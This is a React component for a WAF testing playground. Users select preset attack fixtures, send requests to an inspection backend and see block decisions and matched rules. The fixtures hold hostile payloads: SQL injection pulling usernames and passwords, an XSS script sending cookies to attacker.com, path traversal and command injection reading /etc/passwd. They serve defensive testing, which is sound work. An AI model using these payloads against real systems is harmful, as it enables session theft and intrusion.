import React, { useState } from 'react';
import { api } from '../services/api';
import { ThreatBadge } from '../components/ThreatBadge';
import { Terminal, Play, ShieldAlert, CheckCircle, AlertTriangle, RefreshCw } from 'lucide-react';

const PRESET_FIXTURES = [
  {
    label: 'SQL Injection Fixture (UNION SELECT)',
    method: 'GET',
    path: '/api/search',
    query: { q: "1' UNION SELECT username, password FROM users--" },
    headers: {},
    body: {},
  },
  {
    label: 'XSS Script Injection Fixture',
    method: 'POST',
    path: '/api/comments',
    query: {},
    headers: { 'content-type': 'application/json' },
    body: { comment: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>" },
  },
  {
    label: 'Path Traversal / LFI Fixture',
    method: 'GET',
    path: '/api/download',
    query: { file: '../../../../etc/passwd' },
    headers: {},
    body: {},
  },
  {
    label: 'Command Injection Fixture',
    method: 'GET',
    path: '/api/search',
    query: { q: "1; cat /etc/passwd" },
    headers: {},
    body: {},
  },
  {
    label: 'Legitimate Request Fixture (Allow)',
    method: 'GET',
    path: '/api/data',
    query: {},
    headers: {},
    body: {},
  }
];

export const RequestInspector: React.FC = () => {
  const [method, setMethod] = useState('GET');
  const [path, setPath] = useState('/api/search');
  const [queryStr, setQueryStr] = useState('q=1\' UNION SELECT 1,2--');
  const [headersStr, setHeadersStr] = useState('{\n  "user-agent": "Sentinel-Inspector/1.0"\n}');
  const [bodyStr, setBodyStr] = useState('{}');
  
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<any>(null);

  const applyFixture = (fixture: typeof PRESET_FIXTURES[0]) => {
    setMethod(fixture.method);
    setPath(fixture.path);
    setQueryStr(new URLSearchParams(fixture.query as any).toString());
    setHeadersStr(JSON.stringify(fixture.headers, null, 2));
    setBodyStr(JSON.stringify(fixture.body, null, 2));
    setResult(null);
  };

  const handleExecute = async () => {
    setLoading(true);
    setResult(null);

    let queryObj = {};
    if (queryStr) {
      const params = new URLSearchParams(queryStr);
      queryObj = Object.fromEntries(params.entries());
    }

    let headersObj = {};
    try {
      headersObj = JSON.parse(headersStr);
    } catch {
      alert('Invalid JSON in Headers');
      setLoading(false);
      return;
    }

    let bodyObj = {};
    try {
      if (bodyStr.trim()) bodyObj = JSON.parse(bodyStr);
    } catch {
      alert('Invalid JSON in Request Body');
      setLoading(false);
      return;
    }

    try {
      const res = await api.executeInspector({
        method,
        path,
        query: queryObj,
        headers: headersObj,
        body: bodyObj,
      });
      setResult(res);
    } catch (err: any) {
      alert(err.message || 'Execution failed');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="p-6 space-y-6">
      {/* Title */}
      <div>
        <h1 className="text-xl font-bold text-slate-100 uppercase tracking-tight flex items-center gap-2">
          <Terminal className="w-5 h-5 text-cyan-400" />
          Interactive Request Inspector & Security Playground
        </h1>
        <p className="text-xs text-slate-400">Craft or Select Sample Security Attack Fixtures and Evaluate WAF Rule Matches</p>
      </div>

      {/* Preset Fixtures Bar */}
      <div className="bg-dark-800 p-4 rounded-lg border border-dark-700 space-y-2">
        <span className="text-xs text-slate-400 font-mono block">Pre-populated Threat & Legitimate Test Fixtures:</span>
        <div className="flex flex-wrap gap-2">
          {PRESET_FIXTURES.map((fixture, idx) => (
            <button
              key={idx}
              onClick={() => applyFixture(fixture)}
              className="px-3 py-1 rounded bg-dark-900 border border-dark-700 hover:border-cyan-500 text-xs font-mono text-cyan-400 transition-colors"
            >
              {fixture.label}
            </button>
          ))}
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Request Builder Form */}
        <div className="bg-dark-800 border border-dark-700 rounded-lg p-5 space-y-4">
          <h3 className="text-xs uppercase font-mono font-bold text-slate-300">Request Configuration</h3>

          <div className="grid grid-cols-3 gap-3">
            <div>
              <label className="block text-slate-400 text-xs font-mono mb-1">Method</label>
              <select
                value={method}
                onChange={(e) => setMethod(e.target.value)}
                className="w-full bg-dark-900 border border-dark-700 rounded p-2 text-xs font-mono text-cyan-400 font-bold"
              >
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="PUT">PUT</option>
                <option value="DELETE">DELETE</option>
              </select>
            </div>
            <div className="col-span-2">
              <label className="block text-slate-400 text-xs font-mono mb-1">Target Path</label>
              <input
                type="text"
                value={path}
                onChange={(e) => setPath(e.target.value)}
                className="w-full bg-dark-900 border border-dark-700 rounded p-2 text-xs font-mono text-slate-200"
              />
            </div>
          </div>

          <div>
            <label className="block text-slate-400 text-xs font-mono mb-1">Query Parameters (URL encoded)</label>
            <input
              type="text"
              value={queryStr}
              onChange={(e) => setQueryStr(e.target.value)}
              className="w-full bg-dark-900 border border-dark-700 rounded p-2 text-xs font-mono text-amber-300"
            />
          </div>

          <div>
            <label className="block text-slate-400 text-xs font-mono mb-1">Headers (JSON)</label>
            <textarea
              rows={3}
              value={headersStr}
              onChange={(e) => setHeadersStr(e.target.value)}
              className="w-full bg-dark-900 border border-dark-700 rounded p-2 text-xs font-mono text-slate-300"
            />
          </div>

          <div>
            <label className="block text-slate-400 text-xs font-mono mb-1">Request Body (JSON)</label>
            <textarea
              rows={4}
              value={bodyStr}
              onChange={(e) => setBodyStr(e.target.value)}
              className="w-full bg-dark-900 border border-dark-700 rounded p-2 text-xs font-mono text-red-300"
            />
          </div>

          <button
            onClick={handleExecute}
            disabled={loading}
            className="w-full py-2.5 rounded-lg bg-cyan-950 text-cyan-400 border border-cyan-800 font-mono text-xs font-bold flex items-center justify-center gap-2 hover:bg-cyan-900 transition-colors"
          >
            {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4 fill-cyan-400" />}
            Execute WAF Inspection Test
          </button>
        </div>

        {/* Inspection Results Panel */}
        <div className="bg-dark-800 border border-dark-700 rounded-lg p-5 space-y-4">
          <h3 className="text-xs uppercase font-mono font-bold text-slate-300">WAF Decision Breakdown</h3>

          {result ? (
            <div className="space-y-4 text-xs font-mono">
              {/* Verdict Header */}
              <div className={`p-4 rounded-lg border flex items-center justify-between ${
                result.inspectionResult.decision === 'BLOCK'
                  ? 'bg-red-950/80 border-red-800'
                  : result.inspectionResult.decision === 'LOG'
                  ? 'bg-amber-950/80 border-amber-800'
                  : 'bg-emerald-950/80 border-emerald-800'
              }`}>
                <div>
                  <span className="text-[10px] text-slate-400 uppercase block">FINAL DECISION ({result.inspectionResult.effectiveMode} MODE)</span>
                  <span className="text-lg font-bold">{result.inspectionResult.decision}</span>
                </div>
                <div className="text-right">
                  <span className="text-[10px] text-slate-400 uppercase block">RISK SCORE</span>
                  <span className="text-lg font-bold text-amber-400">{result.inspectionResult.riskScore} / 100</span>
                </div>
              </div>

              {/* Explanation */}
              <div className="p-3 rounded bg-dark-900 border border-dark-700 space-y-1">
                <span className="text-slate-500 uppercase text-[10px]">Explanation</span>
                <p className="text-slate-200 font-sans">{result.inspectionResult.explanation}</p>
              </div>

              {/* Matched Rules Table */}
              <div className="space-y-2">
                <span className="text-slate-400 uppercase text-[10px] block">Matched Rules ({result.inspectionResult.matchedRulesCount})</span>
                {result.inspectionResult.matchedRules.length > 0 ? (
                  result.inspectionResult.matchedRules.map((rule: any, i: number) => (
                    <div key={i} className="p-3 rounded bg-dark-900 border border-dark-700 space-y-1">
                      <div className="flex justify-between font-bold">
                        <span className="text-amber-400">{rule.ruleId}: {rule.name}</span>
                        <ThreatBadge type="severity" value={rule.severity} />
                      </div>
                      <p className="text-slate-400 text-[11px] font-sans">{rule.explanation}</p>
                      <p className="text-slate-500 text-[10px]">Field: {rule.matchedField} | Pattern: <span className="text-amber-300">{rule.matchedPattern}</span></p>
                    </div>
                  ))
                ) : (
                  <p className="text-slate-500 text-center py-4">No security rules matched. Request permitted.</p>
                )}
              </div>
            </div>
          ) : (
            <div className="h-64 flex flex-col items-center justify-center text-slate-500 font-mono text-xs space-y-2">
              <ShieldAlert className="w-8 h-8 text-slate-600" />
              <p>Configure a request or select a preset fixture above and click 'Execute WAF Inspection Test'.</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
